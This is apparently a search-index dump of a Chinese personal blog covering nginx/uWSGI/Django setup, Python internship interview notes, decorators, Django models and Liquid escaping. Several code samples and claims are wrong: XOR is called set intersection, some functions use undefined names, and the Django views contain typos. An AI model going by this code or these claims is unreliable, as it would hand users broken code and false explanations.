404 错误。 nginx and uWSGI and test.py 现在进入 /mysite/ 文件夹 输入以下命令 ： uwsgi --socket :8001 --wsgi-file test.py 在浏览器中访问 http://127.0.0.1:8000 如果出现 ‘Hello World!’ 则说明以下链接是成功的 : the web client \u003c-\u003e the web server \u003c-\u003e the socket \u003c-\u003e uWSGI \u003c-\u003e Python ","date":"2016-02-27","objectID":"/zh-cn/nginx-uwsgi-django/:0:4","tags":["Python","Django","Nginx"],"title":"在 Ubuntu 下搭建 uWSGI + nginx + Django","uri":"/zh-cn/nginx-uwsgi-django/"},{"categories":["Code","Python"],"content":"用 UNIX socket 取代 TCP port 在 mysite/ 文件夹下创建一个新文件 mysite.sock （空文本文档即可）。 然后对 mysite_nginx.conf 做以下修改 : server unix:///path/to/your/mysite/mysite.sock; # for a file socket # server 127.0.0.1:8001; # for a web port socket (we'll use this first) 运行 : sudo /etc/init.d/nginx restart uwsgi --socket mysite.sock --wsgi-file test.py 打开 http://127.0.0.1:8000 结果报错了，出现了这个错误 [crit] 4133#0: *1 connect() to unix:/home/thehackercat/Dev/mysite/mysite.sock failed (13: Permission denied) while connecting to upstream, client: 127.0.0.1, server: 127.0.0.1, request: \"GET / HTTP/1.1\", upstream: \"uwsgi://unix:/home/thehackercat/Dev/mysite/mysite.sock:\", host: \"127.0.0.1:8000\" 发现原来是权限的问题，于是在命令中加入这一段 : uwsgi --socket mysite.sock --wsgi-file test.py --chmod-socket=666 然后就成功了！ 用 uswgi 和 nginx 跑 Django 应用 如果上面一切都运行正常，则输入下面命令可以跑 Django 应用 : uwsgi --socket mysite.sock --module mysite.wsgi --chmod-socket=666 ","date":"2016-02-27","objectID":"/zh-cn/nginx-uwsgi-django/:0:5","tags":["Python","Django","Nginx"],"title":"在 Ubuntu 下搭建 uWSGI + nginx + Django","uri":"/zh-cn/nginx-uwsgi-django/"},{"categories":["Code","Python"],"content":"配置 uWSGI 便捷开启服务器 如果每次都按上述命令来跑 Django 应用实在麻烦，所以使用 .ini 文件来简化工作，便捷开启服务器，方法如下 : 在 /mysite/ 文件夹下创建文件 mysite_uwsgi.ini ，并填写修改下面内容 : mysite_uwsgi.ini file [uwsgi] # Django-related settings # the base directory (full path) chdir = /home/thehackercat/Dev/mysite # Django's wsgi file module = mysite.wsgi # the virtualenv (full path) 如果你没有装 virtualenv 就把下面这行用注释掉 home = /usr/bin/virtualenv # process-related settings # master master = true # maximum number of worker processes processes = 10 # the socket (use the full path to be safe socket = /home/thehackercat/Dev/mysite/mysite.sock # ... with appropriate permissions - may be needed chmod-socket = 666 # clear environment on exit vacuum = true 现在，只要运行以下命令，就可以跑 Django 应用了 : uwsgi --ini mysite_uwsgi.ini 到这里，如果你在浏览器中访问http://127.0.0.1:8000 可以看到正常的 Django 页面，则说明 uWSGI + nginx + Django 配置成功！ 参考文档 nginx与Django不可不说的秘密 Setting up Django and your web server with uWSGI and nginx 有些同学一定会被网上各种教程的 Django 目录结构搞得头大，其实这个目录是可自定义的，下面是我的目录结构 : ","date":"2016-02-27","objectID":"/zh-cn/nginx-uwsgi-django/:0:6","tags":["Python","Django","Nginx"],"title":"在 Ubuntu 下搭建 uWSGI + nginx + Django","uri":"/zh-cn/nginx-uwsgi-django/"},{"categories":["Interview"],"content":"背景 12月23号下午2：00参加了绿盟的 Web 后端开发实习生的面试。考官是个胖哥哥，也是科大的，人很温柔和蔼。先问了一些数据结构与算法的问题，接着问了计算机网络的一些基础问题，最后考察了下 Web 开发的一些知识。总得来说题目不难，但是自己也发挥不好，原来以为有了几次面经，但是在现场还是紧张得不行。 (真是给自己的心理素质跪了 ：P) ","date":"2015-12-23","objectID":"/zh-cn/nsfocus-interview/:1:0","tags":["Interview","Code"],"title":"绿盟 Web 后端实习面试心得","uri":"/zh-cn/nsfocus-interview/"},{"categories":["Interview"],"content":"(数据结构与算法)图的遍历 我怕出错就写了5个结点的无向图，如下： 然后写了广度优先遍历： 1-\u003e2-\u003e3-\u003e4-\u003e5 深度优先遍历： 1-\u003e2-\u003e5-\u003e4-\u003e3 ","date":"2015-12-23","objectID":"/zh-cn/nsfocus-interview/:2:0","tags":["Interview","Code"],"title":"绿盟 Web 后端实习面试心得","uri":"/zh-cn/nsfocus-interview/"},{"categories":["Interview"],"content":"(数据结构与算法)写个排序算法求列表中倒数第二大的元素 我用 Python 写了个冒泡排序来处理： # 冒泡排序 def bubbleSort(L): for passnum in range(len(L)-1,0,-1): for i in range(passnum): if L[i] \u003e L[i+1]: L[i],L[i+1] = L[i+1],L[i] return L[-2] ","date":"2015-12-23","objectID":"/zh-cn/nsfocus-interview/:3:0","tags":["Interview","Code"],"title":"绿盟 Web 后端实习面试心得","uri":"/zh-cn/nsfocus-interview/"},{"categories":["Interview"],"content":"(数据结构与算法)去重的优化算法 接着不造为什么就谈到了之前在海豚面试的时候对算法时间复杂度进行优化的问题，然后考官问了我一个去除一个列表中重复元素的算法。 # 去重 def induplicate(L): L1 = [] return [L2.append(i) for i in L if not i in L2] 这样通过增加空间复杂度来降低时间复杂度 ","date":"2015-12-23","objectID":"/zh-cn/nsfocus-interview/:4:0","tags":["Interview","Code"],"title":"绿盟 Web 后端实习面试心得","uri":"/zh-cn/nsfocus-interview/"},{"categories":["Interview"],"content":"Http 状态码 这个我当时说错了 我说的是 2 开头的是成功 3 开头的是需要等待 4 开头的通常是请求出错 5 开头的是服务器问题 后来回来查了下 3 开头的标识重定向 5 开头的表示服务不可用 ","date":"2015-12-23","objectID":"/zh-cn/nsfocus-interview/:5:0","tags":["Interview","Code"],"title":"绿盟 Web 后端实习面试心得","uri":"/zh-cn/nsfocus-interview/"},{"categories":["Interview"],"content":"TCP 3次握手连接和4次握手断开连接的过程 这个不能更经典了。 就不详细列出了，可以参见这个详解 ","date":"2015-12-23","objectID":"/zh-cn/nsfocus-interview/:6:0","tags":["Interview","Code"],"title":"绿盟 Web 后端实习面试心得","uri":"/zh-cn/nsfocus-interview/"},{"categories":["Interview"],"content":"设计一个产品参数配置页面布局 我本来打算多扯一些的，因为最近正好在看的《写给大家看的设计书》，但是词穷了，就画了个抽屉菜单的布局,但是感觉还有很多交互设计的地方我欠考虑。 ","date":"2015-12-23","objectID":"/zh-cn/nsfocus-interview/:7:0","tags":["Interview","Code"],"title":"绿盟 Web 后端实习面试心得","uri":"/zh-cn/nsfocus-interview/"},{"categories":["Interview"],"content":"Http 和 Https 的区别 这个我没答出来，我只知道 Https 是经过一定手段加密使得 Http 传输的数据包中一些明文数据变得\"隐晦”，但是具体的实现方法不太清楚。 后来我看了一篇 Blog，主要是用 SSL/TLS 来对数据包进行加密。 这样经过 SSL/TLS 协议加密后，当客户端收到服务器的 Https 请求后，会查询本机所支持的加密算法，并通过该算法来解密 Https 请求。 ","date":"2015-12-23","objectID":"/zh-cn/nsfocus-interview/:8:0","tags":["Interview","Code"],"title":"绿盟 Web 后端实习面试心得","uri":"/zh-cn/nsfocus-interview/"},{"categories":["Interview"],"content":"总结 这次面试总的来说题目相对简单。 面试官也教了我很多网安方面的知识，比如12306的签名协议和网关安全，虽然我是网络安全方面的小白，但是我觉得 Web 安全很炫酷。 ","date":"2015-12-23","objectID":"/zh-cn/nsfocus-interview/:9:0","tags":["Interview","Code"],"title":"绿盟 Web 后端实习面试心得","uri":"/zh-cn/nsfocus-interview/"},{"categories":["Interview"],"content":"背景 12月11号下午4：30参加了海豚浏览器的 Python 后台开发实习生的电面，考官一开始先问了我一些 Python 基础的问题，接着问了些计网的经典面试题，最后考了2道算法题，然后开始扯皮一些之前做过的项目中的问题等，最后总结心得如下： ","date":"2015-12-18","objectID":"/zh-cn/dolphin-interview/:1:0","tags":["Interview","Code"],"title":"海豚浏览器 Python 实习面试心得","uri":"/zh-cn/dolphin-interview/"},{"categories":["Interview"],"content":"Python 的 List 能不能作为字典的 key 传入？ 我回答的是不能，因为字典的 key 值必须是不变的，而 List 的值是可变的。 之后我上网查了下，更标准的说法是，Python Dict 的 key 值是 hashable 的，即 这个 key 值在其生命周期内是不变的。 并且可以和其他对象进行比较。 以下是官方对于 hashable 给出的解释： An object is hashable if it has a hash value which never changes during its lifetime (it needs a hash() method), and can be compared to other objects (it needs an eq() or cmp() method). Hashable objects which compare equal must have the same hash value. Hashability makes an object usable as a dictionary key and a set member, because these data structures use the hash value internally. All of Python’s immutable built-in objects are hashable, while no mutable containers (such as lists or dictionaries) are. Objects which are instances of user-defined classes are hashable by default; they all compare unequal (except with themselves), and their hash value is their id(). 所以得出，Python 中所有不变的内奸对象都是 hashable 的，所有可变的容器(比如，list or dict)都不是 hashable 的，故不能作为字典的 key。 ","date":"2015-12-18","objectID":"/zh-cn/dolphin-interview/:2:0","tags":["Interview","Code"],"title":"海豚浏览器 Python 实习面试心得","uri":"/zh-cn/dolphin-interview/"},{"categories":["Interview"],"content":"Python 装饰器是什么，有什么看法？ 正好之前我写了一篇深入理解 Python 装饰器的 blog 我就向他解释了下，装饰器是在不修改原先代码块的情况下，为其加上一些装饰。 然后我扯了一些装饰器所使用的 Python 语言的几个特性 闭包 把函数作为参数传递 装饰器的迭代 ","date":"2015-12-18","objectID":"/zh-cn/dolphin-interview/:3:0","tags":["Interview","Code"],"title":"海豚浏览器 Python 实习面试心得","uri":"/zh-cn/dolphin-interview/"},{"categories":["Interview"],"content":"Python 的 yield() 函数的看法？ 我想起来之前有看过一篇 blog 正好讲过。 yield 函数是 Python 在进行迭代时，函数内部的代码并不立刻执行，而是返回一个 generator 对象，接着每次迭代时，再读取下一个元素。 这样的好处在于，不需要一次性读取全部对象，二是实时地读取生成数据，减少了内存的开支。 ","date":"2015-12-18","objectID":"/zh-cn/dolphin-interview/:4:0","tags":["Interview","Code"],"title":"海豚浏览器 Python 实习面试心得","uri":"/zh-cn/dolphin-interview/"},{"categories":["Interview"],"content":"解释下 Django 的 MVC 模式，其中那一部分充当的是 controller 的部分？ 我解释了下，其实 Django 是一个 MTV 模式的框架, MTV 三个部分如下， 模型( Model )，数据存取层：处理与数据相关的所有事务，即如何存取、如何验证有效性、包含哪些行为以及数据之间的关系等。 模板( Template )，表现层：处理与表现相关的决定，即如何在页面或其他类型文档中进行显示。 视图( View )，业务逻辑层：存取模型及调取恰当模板的相关逻辑。模型与模板之间的桥梁。 而其中作为 controller 的部分是 Django 的 URLconf。 它获取用户在地址栏中输入的 URL 并将其路由到 views 模块对应的各个函数，并调用他们。实现了相应的视图函数路由到相应界面的映射功能。 ","date":"2015-12-18","objectID":"/zh-cn/dolphin-interview/:5:0","tags":["Interview","Code"],"title":"海豚浏览器 Python 实习面试心得","uri":"/zh-cn/dolphin-interview/"},{"categories":["Interview"],"content":"Django 中的缓存用过吗？看法是？ 正好之前在写一个 Django 练手的图书馆项目中试过 Django 的缓存机制，所以就以那个例子介绍了下。 Django 的缓存系统让开发者能够缓存某个视图的输出。这个缓存是无法在浏览器缓存中控制的，因为它并不包含在 http 头部内。 我用的是 Django 缓存系统的 memcached。 memcached 作为一个后台进程运行，并分配一个指定的内存量，它所实现的功能是提供一个添加、检索和删除缓存中任意数据的快速接口，所有的数据是直接存储在内存中的，所以没有用到数据库或者文件系统，减少了额外开销。 但是 memcached 有一个缺点是，它的缓存是完全存在内存中的，一旦服务器崩溃，辣么所有缓存的数据就丢失了。 其他的缓存机制偶没有用过，所以就没有谈。 ","date":"2015-12-18","objectID":"/zh-cn/dolphin-interview/:6:0","tags":["Interview","Code"],"title":"海豚浏览器 Python 实习面试心得","uri":"/zh-cn/dolphin-interview/"},{"categories":["Interview"],"content":"用户在浏览器中输入一个网址，到 Django 后台捕捉到请求其中的过程？ 这个我当时貌似讲偏题了，我说的是 用户输入一个网址后 浏览器先检查缓存，如果有缓存，就从缓存中获得资源文件并加载，如果木有缓存，则执行下一步。 进行 DNS 域名解析，将域名解析成 ip 地址。 与 ip 地址对影的服务器进行 TCP 连接。 接着经历 TCP 3次握手过程。 一旦连接建立后，开始发送 Http 请求。 服务器获得 Http 请求后，将该请求打包成 HttpRequest 对象。 接着检查 Request 中是否需要 Django 中间件的方法，如果没有则执行下一步。 判断 Request 中的各种信息，诸如 user_agent、GET/POST 等，并在 URLconf 中进行匹配路由到对应的 views 视图函数中。 返回一个 Response 对象，并调用相应的 views 视图函数。 最后返回一个 Http 相应，并加载页面。 ","date":"2015-12-18","objectID":"/zh-cn/dolphin-interview/:7:0","tags":["Interview","Code"],"title":"海豚浏览器 Python 实习面试心得","uri":"/zh-cn/dolphin-interview/"},{"categories":["Interview"],"content":"(数据结构与算法)获得两个列表的交集 我第一次写的是 def intset(L1,L2): L = [] for i in L1: if i not in L2: L.append(i) return L 接着考官问我，这个时间复杂度是多少，很明显是O(n^2)，他又问我有没有更好的方法， 于是我写了第二种方法 def intset2(L1,L2): L = [set(L1)^set(L2)] return L 这样先把L1、L2列表中重复的元素删除了，接着再用异或符来取得他们的交集。 ","date":"2015-12-18","objectID":"/zh-cn/dolphin-interview/:8:0","tags":["Interview","Code"],"title":"海豚浏览器 Python 实习面试心得","uri":"/zh-cn/dolphin-interview/"},{"categories":["Interview"],"content":"(数据结构与算法)一个人一次可以爬3级或5级的台阶，请问他爬到第m层时，有n种解法，求解 这个我当时没写出来，我第一眼感觉是递归的题，后来室友告诉我是线性规划的题。之后我在 leetcode 上也看到了相应的解法，真是太蠢了我！ leetcode 解法如下： class Solution: # @param {integer} n # @return {integer} def climbStairs(self, n): if n==1 or n==2: return n a=1;b=2;c=3 for i in range(3,n+1): c=a+b;a=b;b=c return c ","date":"2015-12-18","objectID":"/zh-cn/dolphin-interview/:9:0","tags":["Interview","Code"],"title":"海豚浏览器 Python 实习面试心得","uri":"/zh-cn/dolphin-interview/"},{"categories":["Interview"],"content":"总结 以上就是我这次 Python 实习面试的大部分考题，面试完之后感觉自己基础还是不扎实，对于性能优化的理解还有缺陷，代码写得不够漂亮，算法方面很薄弱。故决定刷一下 Python 文档和 Leetcode。 而且这次面试感觉要黄，因为都一星期了，HR 还是木有给我打电话 T.T 不过，我有了其他的考虑了，心理也安定了许多。 现在，我只想去睡个十除以三的懒觉。 ","date":"2015-12-18","objectID":"/zh-cn/dolphin-interview/:10:0","tags":["Interview","Code"],"title":"海豚浏览器 Python 实习面试心得","uri":"/zh-cn/dolphin-interview/"},{"categories":["Code","Python"],"content":"由于官网教程讲得迷迷糊糊的，所以我提炼了下代码，发现便于理解很多。 ","date":"2015-12-08","objectID":"/zh-cn/django-learning4/:0:0","tags":["Python","Django"],"title":"Django 高级 views 和 URLconf 配置","uri":"/zh-cn/django-learning4/"},{"categories":["Code","Python"],"content":"URLconf 技巧 # 在模块开始导入关联的视图函数，直接传递函数对象 from django.conf.urls import include, url from django.contrib import admin from mysite.views import hello, current_datetime, hours_ahead urlpatterns = [ url(r'^admin/', include(admin.site.urls)), url(r'^hello/$', hello), url(r'^time/$', current_datetime), url(r'^time/plus/(\\d{1,2})/$', hours_ahead), ] # 在模块开始导入 views 模块，传递 views.视图函数 from django.conf.urls import include, url from django.contrib import admin from mysite import views urlpatterns = [ url(r'^admin/', include(admin.site.urls)), url(r'^hello/$', views.hello), url(r'^time/$', views.current_datetime), url(r'^time/plus/(\\d{1,2})/$', views.hours_ahead), ] # 传入一个包含模块名+函数名的对象 from django.conf.urls import include, url from django.contrib import admin urlpatterns = [ url(r'^admin/', include(admin.site.urls)), url(r'^hello/$', 'mysite.views.hello'), url(r'^time/$', 'mysite.views.current_datetime'), url(r'^time/plus/(\\d{1,2})/$', 'mysite.views.hours_ahead'), ] # 开启 URLconf 调试模式 from django.conf.urls import include, url from django.contrib import admin from mysite import views urlpatterns = [ url(r'^admin/', include(admin.site.urls)), url(r'^hello/$', views.hello), url(r'^time/$', views.current_datetime), url(r'^time/plus/(\\d{1,2})/$', views.hours_ahead), ] if settings.DEBUG: urlpatterns += url(r'^debuginfo/$', views.debug), ) ","date":"2015-12-08","objectID":"/zh-cn/django-learning4/:1:0","tags":["Python","Django"],"title":"Django 高级 views 和 URLconf 配置","uri":"/zh-cn/django-learning4/"},{"categories":["Code","Python"],"content":"命名组 我觉得命名组的模式增加了代码冗余度，且语义化也不好。对于我这种懒人完全不需要 ：D (其实就是我懒的借口) 而它的目的在于，将变量以位置参数的方式传递给视图函数变为以关键字参数的方式传递。 # 无名组，以位置参数传递变量 from django.conf.urls import include, url from django.contrib import admin from mysite import views urlpatterns = [ url(r'^admin/', include(admin.site.urls)), url(r'^articles/(\\d{4})/$'， view.year_archive), url(r'^articles/(\\d{4})/(\\d{2})/$', views.month_archive), ] # 命名组，以关键字参数传递变量 from django.conf.urls import include, url from django.contrib import admin from mysite import views urlpatterns = [ url(r'^admin/', include(admin.site.urls)), url(r'^articles/(?P\u003cyear\u003e\\d{4})/$'， view.year_archive), url(r'^articles/(?P\u003cyear\u003e\\d{4})/(?\u003cmonth\u003e\\d{2})/$', views.month_archive), ] ","date":"2015-12-08","objectID":"/zh-cn/django-learning4/:2:0","tags":["Python","Django"],"title":"Django 高级 views 和 URLconf 配置","uri":"/zh-cn/django-learning4/"},{"categories":["Code","Python"],"content":"最近在写 Python+Django 的时候发现，有时候封装 API 的时候经常会遗失一些重复的装饰信息，但是直接封装到方法里是比较差劲的写法，因为有多个模块可能同时需要这些装饰信息，所以我希望使用一种可以迭代的装饰器。于是我在 Stack Overflow 上找到了相应的解答。下面以这篇解答为引写下我理解 Python decorator 的思路过程。 ","date":"2015-12-07","objectID":"/zh-cn/python-decorator-learning/:0:0","tags":["Python","Syntactic sugar"],"title":"深入理解 Python 装饰器","uri":"/zh-cn/python-decorator-learning/"},{"categories":["Code","Python"],"content":"装饰器是做什么用的？ 装饰器实现对一个已有的模块做一些“修饰工作”，所谓修饰工作就是想给现有的模块加上一些小装饰（一些小功能，这些小功能可能好多模块都会用到），但又不让这个小装饰（小功能）侵入到原有的模块中的代码里去。 ","date":"2015-12-07","objectID":"/zh-cn/python-decorator-learning/:1:0","tags":["Python","Syntactic sugar"],"title":"深入理解 Python 装饰器","uri":"/zh-cn/python-decorator-learning/"},{"categories":["Code","Python"],"content":"装饰器的定义 首先，你需要知道 Python 的闭包，接着发现3点 Python 的特性在装饰器中运用： 函数可以赋值给一个变量。 函数可以定义在另一个函数内部。 函数名可以作为函数返回值。 辣么，先来看一段代码: def getTalk(type=\"shout\"): # 定义函数 def shout(word=\"yes\"): return word.capitalize()+\"!\" def whisper(word=\"yes\") : return word.lower()+\"...\"; # 返回函数 if type == \"shout\": # 没有使用\"()\", 并不是要调用函数，而是要返回函数对象 return shout else: return whisper # 如何使用？ # 将函数返回值赋值给一个变量 talk = getTalk() # 我们可以打印下这个函数对象 print talk #outputs : \u003cfunction shout at 0xb7ea817c\u003e # 这个对象是函数的返回值 print talk() #outputs : Yes! # 不仅如此，你还可以直接使用之 print getTalk(\"whisper\")() #outputs : yes... 既然函数可以作为返回值，是不是函数也可以作为参数传递呢 def doSomethingBefore(func): print \"I do something before then I call the function you gave me\" print func() doSomethingBefore(scream) #outputs: #I do something before then I call the function you gave me #Yes! 所以看过这两段代码，你一定明白了，装饰器的定义。 装饰器就是封装器，可以让你在被装饰函数之前或之后执行代码，而不必修改函数本身代码。 ","date":"2015-12-07","objectID":"/zh-cn/python-decorator-learning/:2:0","tags":["Python","Syntactic sugar"],"title":"深入理解 Python 装饰器","uri":"/zh-cn/python-decorator-learning/"},{"categories":["Code","Python"],"content":"怎么写封装器： 首先，我们来手写一个封装器： def new_decorator(func): def wrapper(): print(\"before the function runs\") func() print(\"after the function runs\") return wrapper def along_func(): print(\"I am a alone function\") decorated_along_func = new_decorator(along_func) decorated_along_func() #outputs: #before the function runs #I am a alone function #after the function runs 这里每次调用 decorated_along_func 函数时，都会将 along_func 函数传入到装饰函数 new_decorator 中，完成封装。 ","date":"2015-12-07","objectID":"/zh-cn/python-decorator-learning/:3:0","tags":["Python","Syntactic sugar"],"title":"深入理解 Python 装饰器","uri":"/zh-cn/python-decorator-learning/"},{"categories":["Code","Python"],"content":"怎么写装饰器： 那将上例代码稍微进行修改： def new_decorator(func): def wrapper(): print(\"before the function runs\") func() print(\"after the function runs\") return wrapper @new_decorator def along_func(): print(\"I am a alone function\") along_func() 就会发现会得到相同的结果，这就是装饰器！ 那么回到我最初的问题，装饰器能否迭代呢？ 可以！ def decorator1(func): def wrapper(): print(\"before the function runs\") func() print(\"after the function runs\") return wrapper def decorator2(func): def wrapper(): print(\"before the decorator1 runs\") func() print(\"after the decorator1 runs\") return wrapper @decorator2 @decorator1 def along_func(): print(\"I am a alone function\") along_func() #outpus: #before the decorator1 runs #before the function runs #I am a alone function #after the function runs #after the decorator1 runs 这种特性十分的便捷，但是必须注意装饰器的顺序。 如果上例代码写成： @decorator1 @decorator2 def along_func(): print(\"I am a alone function\") 那么结果将变为 before the function runs before the decorator1 runs I am a alone function after the decorator1 runs after the function runs ","date":"2015-12-07","objectID":"/zh-cn/python-decorator-learning/:4:0","tags":["Python","Syntactic sugar"],"title":"深入理解 Python 装饰器","uri":"/zh-cn/python-decorator-learning/"},{"categories":["Code","Python"],"content":"一些迭代装饰器的用法 # bold装饰器 def makebold(fn): def wrapper(): # 在前后加入标签 return \"\u003cb\u003e\" + fn() + \"\u003c/b\u003e\" return wrapper # italic装饰器 def makeitalic(fn): def wrapper(): # 加入标签 return \"\u003ci\u003e\" + fn() + \"\u003c/i\u003e\" return wrapper @makebold @makeitalic def say(): return \"hello\" print say() #outputs: \u003cb\u003e\u003ci\u003ehello\u003c/i\u003e\u003c/b\u003e # 等价的代码 def say(): return \"hello\" say = makebold(makeitalic(say)) print say() #outputs: \u003cb\u003e\u003ci\u003ehello\u003c/i\u003e\u003c/b\u003e 是不是灰常炫酷。 ","date":"2015-12-07","objectID":"/zh-cn/python-decorator-learning/:5:0","tags":["Python","Syntactic sugar"],"title":"深入理解 Python 装饰器","uri":"/zh-cn/python-decorator-learning/"},{"categories":["Code","Python"],"content":"高级用法 关于更多装饰器的高级用法，你可以戳以下链接： 戳我 关于 Python Decroator 的各种提案，可以参看： Python Decorator Proposals ","date":"2015-12-07","objectID":"/zh-cn/python-decorator-learning/:6:0","tags":["Python","Syntactic sugar"],"title":"深入理解 Python 装饰器","uri":"/zh-cn/python-decorator-learning/"},{"categories":["Code","Python"],"content":"MTV vs MVC 正如在之前这篇文章所提到的， 把数据存取逻辑、业务逻辑和表现逻辑组合在一起的概念有时被称为软件架构的 Model-View-Controller ( MVC )模式。 在这个模式中， Model 代表数据存取层，View 代表的是系统中选择显示什么和怎么显示的部分，Controller 指的是系统中根据用户输入并视需要访问模型，以决定使用哪个视图的那部分。 而 Django 使用的更多的则是模型( Model )、模板( Template )和视图( Views )的软件设计模式，称为 MTV 模式。我在 Stack Overflow 的这个回答里找到了对于 MTV vs MVC 两种设计模式间的微妙的差别。 其中提到，不能简单的把 Django 视图认为是 MVC 控制器，把 Django 模板认为是 MVC 视图。 两者之间的差别在于，在 Django 中，视图( Views )不处理用户输入，而是用来选择要展示的哪些数据，而不是要如何展示数据。而 Django 模板 仅仅决定如何展现Django视图指定的数据。 或者说, Django 将 MVC 中的视图进一步分解为 Django 视图 和 Django 模板两个部分，分别决定 “展现哪些数据” 和 “如何展现”，使得 Django 的模板可以根据需要随时替换，而不仅仅限制于内置的模板。至于 MVC 控制器部分，由 Django 框架的 URLconf 来实现。 ","date":"2015-11-21","objectID":"/zh-cn/django-learning3/:1:0","tags":["Python","Django"],"title":" Django 学习笔记3-- Models ","uri":"/zh-cn/django-learning3/"},{"categories":["Code","Python"],"content":"模型练手 为了深入了解 Django Models 对数据的操作，我写了一个简单的博客模型作为练手。 在新建模型时遇到了一个 App migrations 问题如下： 后来发现是由于 Django 版本问题，在最近版本把 migrations 移出了所创建的 App 的根目录，只需要执行python manage.py makemigration接着再执行python manage.py migrate即可解决。 写了个简单的博客的增删改查，代码如下： #!/usr/bin/python #-*-coding:utf-8 -*- from django.shortcuts import render from django.http import HttpResponseRedirect from blog.models import Blog from blog import forms from django.template import RequestContext def blog_list(request): blog_list = Blog.objects.all() return render(request,\"blog_list.html\",{'blog_list':blog_list}) def blog_form(request): if request.method == 'POST': form = forms.BlogForm(request.POST) if form.is_valid(): data = form.cleaned_data if 'id' not in data: blog = Blog(title=data['title'],author=data['author'],content=data['content']) blog.save() else: blog = Blog.object.get(id=data.id) blog.title = data['title'] blog.author = date['author'] blog.content = data['content'] blog.save() return HttpResponseRedirect('/blog/list') else: form = forms.BlogForm() return render(request,\"blog_form.html\",context_instance=RequestContext(request)) def blog_del(request): errors = [] if 'id' in request.GET: bid_ = request.GET['id'] Blog.objects.fileter(id=bid_).delete() return HttpResponseRedirect('/blog/list') def blog_view(request): if 'id' in request.GET: bid_ = request.GET['id'] blog = Blog.object.get(id=bid_) form = forms.BlogForm( initial = {'id':blog.id,'title':blog.title,'author':blog.author,'content':blog.content} ) return render(request,\"blog_form.html\",{'form':form},context_instance=RequestContext(request)) else: errors.append(\"参数异常请刷新后重试\") return render(request,\"blog_list.html\",{'errors':errors}) def blog_edit(request): errors = [] if 'id' in request.GET: bid_ = request.GET['id'] blog = Blog.objects.get(id=bid_) form = forms.BlogForm( initial = {'id':blog.id,'title':blog.title,'author':blog.author,'content':blog.content} ) return render_to_response(\"blog_form.html\",{'form':form},context_instance=RequestContext(request)) else: errors.append(\"参数异常请刷新后重试\") return render(request,\"blog_list.html\",{'errors':errors}) #!/usr/bin/python #-*-coding:utf-8 -*- from django import forms class BlogForm(forms.Form): title = forms.CharField(label='标题') author = forms.CharField(label='作者') content = forms.CharField(label='正文',widget=forms.Textarea) 其中 CharField() 相当于赋予了 title 表段 varchar 的属性。 object.all() 相当于执行了一条select * from blog的 sql 语句。 object.get() 相当于执行了一条select * from blog where id='bid_'的获取单个对象的 sql 语句。 object.save() 相当于执行了UPDATE blog SET ... 的 sql 语句。 并用 errors[] 列表来捕捉错误信息，一般防止出现错误的 sql 语句时增加了 blog 表段中的 id 号而其余属性值为空的情况。 感觉相比于 ThinkinPHP 操作表单 GET/POST 请求以及处理数据库方面要方便得多。 ","date":"2015-11-21","objectID":"/zh-cn/django-learning3/:2:0","tags":["Python","Django"],"title":" Django 学习笔记3-- Models ","uri":"/zh-cn/django-learning3/"},{"categories":["Code","Python"],"content":"疑惑 MVC 框架大大缩小了开发者对数据存储的直接操作，框架自动生成 sql 语句并空值数据的存取等。以后写 sql 感觉就跟 Excel 一样了，那应该怎么优化 sql 呢。 顺便吐槽一下，最近 GitHub Repositorie 换新的布局，天热噜，怎么能这么丑！ ","date":"2015-11-21","objectID":"/zh-cn/django-learning3/:3:0","tags":["Python","Django"],"title":" Django 学习笔记3-- Models ","uri":"/zh-cn/django-learning3/"},{"categories":["Code"],"content":"背景 由于之前写 Django – Templates 篇时要用到包含 Liquid 语法的示例代码，而 Octopress (Jekyll) 在后端使用 Liquid 来处理生成 Web Pages ，对于文章内部插入的原本用来作示例的 Liquid 代码会被解析成 Web Pages 生成语句而不是原本的内容。故苦恼了我一会儿 Q.Q 不过这都不是事儿 ","date":"2015-11-20","objectID":"/zh-cn/blog-build-with-liquid/:1:0","tags":["Octopress"],"title":"在 Octopress 中生成包含 liquid 语句的代码","uri":"/zh-cn/blog-build-with-liquid/"},{"categories":["Code"],"content":"解决方法 比如，我之前写的 {% raw %} {% if variable %} {% else %} {% endif %} {% endraw %} 就会因为包含了 {% raw %}{% ... %}{% endraw %} 解决方法是： 在每一块包含 Liquid 语句的代码快前后用 {{ \"{% raw \" }}%} 和 {{ \"{% endraw \" }}% 包括起来。 这样就能确保示例代码不会被错误的解析成 Jekyll Web Pages 生成语句。 但是如果我要显示 {{ \"{% raw \" }}%} 和 {{ \"{% endraw \" }}%} 怎么办呢 ？ 我试着使用使用如下方法： {{ \"{% raw \" }}%} {{ \"{% raw \" }}%} {{ \"{% endraw \" }}%} {{ \"{% endraw \" }}%} 来显示一个 {{ \"{% raw \" }}%} 和 {{ \"{% endraw \" }}%} 后来我在 Stack Overflow 找到了一个回答： 使用 {% raw %}{{ \"{% raw \" }}%}{% endraw %} 就可以得到 {{ \"{% raw \" }}%} 这种方法是正确的。 ","date":"2015-11-20","objectID":"/zh-cn/blog-build-with-liquid/:2:0","tags":["Octopress"],"title":"在 Octopress 中生成包含 liquid 语句的代码","uri":"/zh-cn/blog-build-with-liquid/"},{"categories":["Code","Python"],"content":"虽然 Django 中 Html 可以直接硬编码到 Python 中，但是这种行为并不利于前端开发人员进行维护。所以 Django 有了流模板 ( Liquid Templates )。 ","date":"2015-11-16","objectID":"/zh-cn/django-learning2/:0:0","tags":["Python","Django"],"title":" Django 学习笔记2-- Templates ","uri":"/zh-cn/django-learning2/"},{"categories":["Code","Python"],"content":"流模板基础 举个例子，下面这个模板大致含括了 Django 模板的几个特性。 {% raw %} {% load staticfiles %} \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003e{% block title %}{% endblock %}\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cp\u003eDear {{ person_name }},\u003c/p\u003e \u003cp\u003eThanks for placing an order from {{ company }}. It's scheduled to ship on {{ ship_date|date:\"F J,Y \" }}.\u003c/p\u003e {% if ordered_warranty %} \u003cp\u003eYour warranty information will be included in the packaging.\u003c/p\u003e \u003cp\u003eHere are the items you've ordered: \u003c/p\u003e \u003cul\u003e {% for item in item_list %} \u003cli\u003e {{ item }} \u003c/li\u003e {% endfor %} \u003c/ul\u003e {% else %} \u003cp\u003eYou didnt order a warranty, so you're on your own when the products inevitably stop working. \u003c/p\u003e {% endif %} \u003cp\u003eSincerely,\u003cbr /\u003e{{ company }}\u003c/p\u003e \u003cp\u003efooter\u003c/p\u003e {% block footer %} \u003chr\u003e 